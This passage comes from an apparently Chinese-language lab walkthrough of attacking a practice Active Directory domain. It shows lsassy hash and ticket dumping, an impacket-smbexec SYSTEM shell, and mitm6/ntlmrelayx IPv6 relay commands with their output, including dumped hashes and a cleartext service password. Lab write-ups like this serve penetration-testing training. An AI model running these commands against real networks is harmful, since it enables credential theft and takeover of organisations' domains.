class="hljs-number">36</span> <span class="hljs-number">76</span> <span class="hljs-number">5</span>A  <span class="hljs-title class_">A6</span> <span class="hljs-number">74</span> <span class="hljs-number">1</span>B <span class="hljs-number">5</span>B <span class="hljs-title class_">D8</span> <span class="hljs-number">30</span> <span class="hljs-number">90</span> <span class="hljs-number">2</span>A   .....<span class="hljs-number">6</span>vZ.t.[.<span class="hljs-number">0</span>.*<br><span class="hljs-title class_">NL</span><span class="hljs-variable">$KM</span><span class="hljs-symbol">:a0b9074a5570f9f9facc683015f595a2586929ad87baa59f76ebacf30763715aed26c1fc5a2bd325a074e6e49053d519e8d6bdd0f336765aa6741b5bd830902a</span><br>[*] _SC_MSSQL<span class="hljs-variable">$SQLEXPRESS</span> <br>north.sevenkingdoms.local\<span class="hljs-symbol">sql_svc:</span><span class="hljs-title class_">YouWillNotKerboroast1ngMeeeeee</span><br>[*] <span class="hljs-title class_">Cleaning</span> up... <br>[*] <span class="hljs-title class_">Stopping</span> service <span class="hljs-title class_">RemoteRegistry</span><br>                                                                    <br></code></pre></td></tr></table></figure>

<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(root㉿kaada)-<span class="hljs-string">[/home/kali/Desktop]</span><br>└─# proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">22</span><br><span class="hljs-string">[proxychains]</span> config file found: /etc/proxychains4.conf<br><span class="hljs-string">[proxychains]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.<span class="hljs-number">4</span><br><span class="hljs-string">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4</span>.<span class="hljs-number">17</span><br><span class="hljs-string">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">1080</span>  ...  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">22</span>:<span class="hljs-number">445</span>  ...  OK<br><span class="hljs-string">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">1080</span>  ...  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">22</span>:<span class="hljs-number">445</span>  ...  OK<br><span class="hljs-number">192.168.10.22</span> - NORTH\robb.stark                                    <span class="hljs-string">[NT]</span> 831486ac7f26860c9e2f51ac91e1a07a | <span class="hljs-string">[SHA1]</span> 3bea28f1c440eed7be7d423cefebb50322ed7b6c<br><span class="hljs-number">192.168.10.22</span> - NORTH\CASTELBLACK$                                  <span class="hljs-string">[NT]</span> 0dfd2a24c6bff862ced231c6aab1728a | <span class="hljs-string">[SHA1]</span> 11e014804401b0bfcfc124006dcced43c78e169b<br><span class="hljs-number">192.168.10.22</span> - north.sevenkingdoms.local\CASTELBLACK$              <span class="hljs-string">[PWD]</span> 6400780068003000520028002c006d007a0024002a0038002a00760073002e00780040002e00640038004300210060002800210076006c006100440052002000470025003f0023002700440031005300320055004000340033002f006e005f0071006800290026006b005c00700042007100590054004e0055006900390075007900350072002f006a004c003c002e0057003f0065003a0066007500640070005a0060002500290060006900540043004e003f007600590052004b0032003c005f004b0021003700630045005f002b006c005a005d005d006700340069005f0039002b005900290068002d0026003c00                                                                  <br><span class="hljs-number">192.168.10.22</span> - NORTH\sql_svc                                       <span class="hljs-string">[NT]</span> 84a5092f53390ea48d660be52b93b804 | <span class="hljs-string">[SHA1]</span> 9fd961155e28b1c6f9b3859f32f4779ad6a06404<br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\robb.stark                <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_417c06da_20260201195348.kirbi)                                                                    <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\robb.stark                <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_bd1a0c06_20260201195348.kirbi)                                                                    <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\sql_svc                   <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">47</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_sql_svc_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_de524d22_20260201194729.kirbi)                                                                       <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$              <span class="hljs-string">[TGT]</span> Domain: SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">47</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_SEVENKINGDOMS.LOCAL_ec620120_20260201194729.kirbi)                                                                              <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$              <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">47</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_ab7e3a69_20260201194729.kirbi)                                                                  <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$              <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">47</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_66406877_20260201194729.kirbi)                                                                  <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$              <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">47</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_2cd40ceb_20260201194729.kirbi)                                                                  <br><span class="hljs-number">192.168.10.22</span> - NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$              <span class="hljs-string">[TGT]</span> Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span> <span class="hljs-number">19</span>:<span class="hljs-number">47</span> (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_9deddce9_20260201194729.kirbi)                                                                  <br><span class="hljs-number">20</span> Kerberos tickets written to /root/.config/lsassy/tickets<br><span class="hljs-number">6</span> masterkeys saved to /root/.config/lsassy/masterkeys.txt<br><br></code></pre></td></tr></table></figure>

<p>成功拿下黑城堡！</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># proxychains impacket-smbexec -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.10.22&#x27;</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC<span class="hljs-built_in"> and </span>its affiliated companies <br><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.10.22:445  ...  OK<br>[!] Launching semi-interactive shell - Careful what you<span class="hljs-built_in"> execute</span><br><span class="hljs-built_in"></span>C:\Windows\system32&gt;whoami<br>nt authority\system<br></code></pre></td></tr></table></figure>

<p>还有一种方法是利用 IPv6 投毒进行中继 (Mitm6 + Ntlmrelayx)</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-ntlmrelayx <span class="hljs-number">-6</span> -wh wpadfakeserver.essos.local -t ldaps:<span class="hljs-comment">//meereen.essos.local --add-computer relayedpccreate --delegate-access</span><br><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><span class="hljs-string"></span><br><span class="hljs-string">[*]</span> Protocol Client LDAPS loaded..<br><span class="hljs-string">[*]</span> Protocol Client LDAP loaded..<br><span class="hljs-string">[*]</span> Protocol Client RPC loaded..<br><span class="hljs-string">[*]</span> Protocol Client MSSQL loaded..<br><span class="hljs-string">[*]</span> Protocol Client WINRMS loaded..<br><span class="hljs-string">[*]</span> Protocol Client SMB loaded..<br><span class="hljs-string">[*]</span> Protocol Client HTTPS loaded..<br><span class="hljs-string">[*]</span> Protocol Client HTTP loaded..<br><span class="hljs-string">[*]</span> Protocol Client DCSYNC loaded..<br><span class="hljs-string">[*]</span> Protocol Client IMAPS loaded..<br><span class="hljs-string">[*]</span> Protocol Client IMAP loaded..<br><span class="hljs-string">[*]</span> Protocol Client SMTP loaded..<br><span class="hljs-string">[*]</span> Running <span class="hljs-keyword">in</span> relay mode to single host<br><span class="hljs-string">[*]</span> Setting up SMB Server on port <span class="hljs-number">445</span><br><span class="hljs-string">[*]</span> Setting up HTTP Server on port <span class="hljs-number">80</span><br><span class="hljs-string">[*]</span> Setting up WCF Server on port <span class="hljs-number">9389</span><br><span class="hljs-string">[*]</span> Setting up RAW Server on port <span class="hljs-number">6666</span><br><span class="hljs-string">[*]</span> Setting up WinRM (HTTP) Server on port <span class="hljs-number">5985</span><br><span class="hljs-string">[*]</span> Setting up WinRMS (HTTPS) Server on port <span class="hljs-number">5986</span><br><span class="hljs-string">[*]</span> Setting up RPC Server on port <span class="hljs-number">135</span><br><span class="hljs-string">[*]</span> Multirelay disabled<br><span class="hljs-string"></span><br><span class="hljs-string">[*]</span> Servers started, waiting <span class="hljs-keyword">for</span> connections<br><span class="hljs-string">[*]</span> (HTTP): Client requested path: /wpad.dat<br><span class="hljs-string">[*]</span> Servers started, waiting <span class="hljs-keyword">for</span> connections<br><span class="hljs-string">[*]</span> (HTTP): Client requested path: /wpad.dat<br><span class="hljs-string">[*]</span> (HTTP): Client requested path: /wpad.dat<br><span class="hljs-string">[*]</span> (HTTP): Client requested path: /wpad.dat<br><span class="hljs-string">[*]</span> (HTTP): Serving PAC file to client ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//ipv6.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//www.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//ipv6.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Connection <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps:<span class="hljs-comment">//meereen.essos.local</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//www.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Connection <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps:<span class="hljs-comment">//meereen.essos.local</span><br><span class="hljs-string">[-]</span> (HTTP): Exception <span class="hljs-keyword">while</span> Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local: &quot;socket connection error while opening: [Errno 111] Connection refused&quot;</span><br><span class="hljs-string">[-]</span> (HTTP): Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local failed</span><br><span class="hljs-string">[-]</span> (HTTP): Exception <span class="hljs-keyword">while</span> Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local: &quot;socket connection error while opening: [Errno 111] Connection refused&quot;</span><br><span class="hljs-string">[-]</span> (HTTP): Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local failed</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//www.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//ipv6.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//www.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Connection <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps:<span class="hljs-comment">//meereen.essos.local</span><br><span class="hljs-string">[*]</span> (HTTP): Client requested path: http:<span class="hljs-comment">//ipv6.msftconnecttest.com/connecttest.txt</span><br><span class="hljs-string">[*]</span> (HTTP): Connection <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps:<span class="hljs-comment">//meereen.essos.local</span><br><span class="hljs-string">[-]</span> (HTTP): Exception <span class="hljs-keyword">while</span> Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local: &quot;socket connection error while opening: [Errno 111] Connection refused&quot;</span><br><span class="hljs-string">[-]</span> (HTTP): Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local failed</span><br><span class="hljs-string">[-]</span> (HTTP): Exception <span class="hljs-keyword">while</span> Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local: &quot;socket connection error while opening: [Errno 111] Connection refused&quot;</span><br><span class="hljs-string">[-]</span> (HTTP): Negotiating NTLM with ldaps:<span class="hljs-comment">//meereen.essos.local failed</span><br><br><br></code></pre></td></tr></table></figure>

<p>这边认证好像是失败了。</p>
<p>将域名改为ip地址后显示成功</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-ntlmrelayx <span class="hljs-number">-6</span> -wh wpadfakeserver.essos.<span class="hljs-keyword">local</span> -t ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> <span class="hljs-comment">--add-computer relayedpc --delegate-access --no-validate-privs</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Protocol Client LDAPS loaded..<br>[*] Protocol Client LDAP loaded..<br>[*] Protocol Client RPC loaded..<br>[*] Protocol Client MSSQL loaded..<br>[*] Protocol Client WINRMS loaded..<br>[*] Protocol Client SMB loaded..<br>[*] Protocol Client HTTPS loaded..<br>[*] Protocol Client HTTP loaded..<br>[*] Protocol Client DCSYNC loaded..<br>[*] Protocol Client IMAPS loaded..<br>[*] Protocol Client IMAP loaded..<br>[*] Protocol Client SMTP loaded..<br>[*] Running <span class="hljs-keyword">in</span> relay mode <span class="hljs-keyword">to</span> single host<br>[*] Setting up SMB <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">445</span><br>[*] Setting up HTTP <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span><br>[*] Setting up WCF <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">9389</span><br>[*] Setting up RAW <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">6666</span><br>[*] Setting up WinRM (HTTP) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5985</span><br>[*] Setting up WinRMS (HTTPS) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5986</span><br>[*] Setting up RPC <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">135</span><br>[*] Multirelay disabled<br><br>[*] Servers started, waiting <span class="hljs-keyword">for</span> connections<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: /wpad.dat<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://www.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://www.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://www.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://www.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://www.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> /@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">1</span>]<br>[*] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br><span class="hljs-keyword">Exception</span> <span class="hljs-keyword">in</span> thread Thread<span class="hljs-number">-20</span>:<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://ipv6.msftconnecttest.com/connecttest.txt<br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> /@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">2</span>]<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: http://www.msftconnecttest.com/connecttest.txt<br>[*] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">2</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">2</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> /@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">3</span>]<br><span class="hljs-keyword">Exception</span> <span class="hljs-keyword">in</span> thread Thread<span class="hljs-number">-21</span>:<br>[*] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">3</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">3</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> /@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">4</span>]<br><span class="hljs-keyword">Exception</span> <span class="hljs-keyword">in</span> thread Thread<span class="hljs-number">-22</span>:<br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> /@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">5</span>]<br>[*] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">4</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">4</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span 